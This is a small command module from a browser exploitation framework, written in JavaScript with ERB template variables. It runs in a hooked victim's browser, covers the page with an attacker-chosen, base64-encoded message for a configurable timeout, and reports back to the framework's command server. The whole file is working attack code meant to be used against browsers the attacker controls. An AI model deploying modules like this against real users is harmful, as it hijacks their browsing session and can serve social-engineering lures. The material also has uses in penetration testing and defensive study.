//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function() {
  var timeout = '<%= @timeout %>' * 1000;

  var blockui = function() {
    $j.blockUI({ message: decodeURIComponent(server.encode.base64.decode('<%= Base64.strict_encode64(@message) %>')) });
    setTimeout("$j.unblockUI();", <%= @timeout %> * 1000);
  }

  blockui();
  server.net.send('<%= @command_url %>', <%= @command_id %>, 'result=command sent');

});

